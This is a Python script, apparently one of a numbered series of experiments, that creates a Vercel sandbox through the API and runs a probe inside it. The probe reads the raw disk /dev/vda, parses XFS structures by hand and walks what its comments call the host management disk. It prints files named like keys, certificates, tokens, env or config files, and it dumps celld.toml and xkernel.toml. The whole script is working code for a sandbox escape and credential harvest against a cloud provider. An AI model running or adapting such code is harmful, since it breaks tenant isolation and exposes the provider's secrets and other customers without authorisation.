# 实验J74: 完整 XFS 读取器 —— 宿主管理盘 (vda) 文件树 + 关键文件内容
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj74"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import os, re, struct

f = open("/dev/vda", "rb", buffering=0)
def be16(d, o): return struct.unpack_from(">H", d, o)[0]
def be32(d, o): return struct.unpack_from(">I", d, o)[0]
def be64(d, o): return struct.unpack_from(">Q", d, o)[0]

sb = f.read(512)
bs = be32(sb, 0x04)
agblocks = be32(sb, 0x54)
inodesize = be16(sb, 0x68)
inopblock = be16(sb, 0x6A)
inopblog = sb[0x7B]
agblklog = sb[0x7C]
shift = agblklog + inopblog
rootino = be64(sb, 0x38)
print("bs=%d agblocks=%d inodesize=%d rootino=%d" % (bs, agblocks, inodesize, rootino), flush=True)

def inode_phys(ino):
    agno = ino >> shift
    agino = ino & ((1 << shift) - 1)
    agbno = agino >> inopblog
    inoff = (agino & (inopblock - 1)) * inodesize
    return agno * agblocks * bs + agbno * bs + inoff

def read_inode(ino):
    p = inode_phys(ino)
    f.seek(p)
    return f.read(inodesize)

def parse_extents(d, start):
    # data fork 从 start 起解析 extent 列表 (v3: 每 16B 一个 record)
    recs = []
    i = start
    while i + 16 <= len(d):
        l0 = be64(d, i); l1 = be64(d, i + 8)
        startoff = l0 >> 12
        startblock = ((l0 & 0xFFF) << 43) | (l1 >> 21)
        blockcount = l1 & 0x1FFFFF
        if blockcount == 0 or startoff > 0xFFFFFFFF:
            break
        recs.append((startoff, startblock, blockcount))
        i += 16
    return recs

def read_file(ino, maxsize=1 << 20):
    d = read_inode(ino)
    fmt = d[5]
    size = be64(d, 0x38)
    mode = be16(d, 2)
    out = b""
    if fmt == 1:  # local
        out = d[0xB0:0xB0 + size]
    elif fmt == 2:  # extents
        for so, sblk, cnt in parse_extents(d, 0xB0):
            f.seek(sblk * bs)
            want = min(cnt * bs, maxsize - len(out))
            out += f.read(want)
            if len(out) >= maxsize:
                break
    return mode, fmt, size, out

def parse_dir(ino, depth, path, stats):
    if depth > 6 or ino in seen_dir:
        return
    seen_dir.add(ino)
    mode, fmt, size, data = read_file(ino, 1 << 20)
    stats["dirs"] += 1
    if fmt == 1:
        # 短格式目录: count(1) i8count(1) parent(4) 然后项
        e = 6
        while e + 11 <= len(data):
            ino2 = be64(data, e)
            namelen = data[e + 8]
            if namelen == 0 or e + 9 + namelen > len(data):
                break
            name = data[e + 9:e + 9 + namelen].decode(errors="replace")
            handle_entry(ino2, name, depth, path, stats)
            e += 9 + namelen
    elif fmt in (2, 3):
        # 块格式: 找 XDB2/XDB3 magic 的块
        # 遍历 extents 每块
        if fmt == 2:
            recs = parse_extents(data, 0xB0)
            for so, sblk, cnt in recs:
                for b in range(cnt):
                    f.seek((sblk + b) * bs)
                    blk = f.read(bs)
                    magic = blk[:4]
                    if magic in (b"XDB2", b"XDB3"):
                        hdr = 28 if magic == b"XDB2" else 40
                        e = hdr
                        while e + 11 <= bs:
                            ino2 = be64(blk, e)
                            namelen = blk[e + 8]
                            if ino2 == 0 or namelen == 0 or e + 9 + namelen > bs:
                                break
                            name = blk[e + 9:e + 9 + namelen].decode(errors="replace")
                            handle_entry(ino2, name, depth, path, stats)
                            e += 9 + namelen
        # btree 格式暂跳过
    stats["unparsed"] += 0

def handle_entry(ino2, name, depth, path, stats):
    if ino2 == 0 or name in (".", ".."):
        return
    mode, fmt, size, content = read_file(ino2)
    isdir = (mode & 0o170000) == 0o040000
    full = path + "/" + name
    if isdir:
        if depth < 6:
            parse_dir(ino2, depth + 1, full, stats)
    else:
        stats["files"] += 1
        if stats["files"] <= 200:
            print("  %s (ino=%d fmt=%d size=%d)" % (full, ino2, fmt, size), flush=True)
        if size <= 4096 and any(k in full for k in ["cell", "toml", "pem", "cert", "key", "conf", "env", "token"]):
            print("    >>> %r" % content[:800], flush=True)

seen_dir = set()
stats = {"dirs": 0, "files": 0, "unparsed": 0}
print("== [1] 宿主管理盘目录树 (root=%d) ==" % rootino, flush=True)
handle_entry(rootino, "", 0, "", stats)
print("dirs=%d files=%d (前200文件)" % (stats["dirs"], stats["files"]), flush=True)

print("== [2] 直接读 celld.toml (0x8D000) / xkernel (0x8E000) ==", flush=True)
for off, tag in [(0x8D000, "celld.toml"), (0x8E000, "xkernel.toml")]:
    f.seek(off)
    d = f.read(2048)
    print("--- %s ---" % tag, flush=True)
    print(repr(d[:600]), flush=True)
f.close()
"""
run_cmd(sid, PROBE, "xfs-tree", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
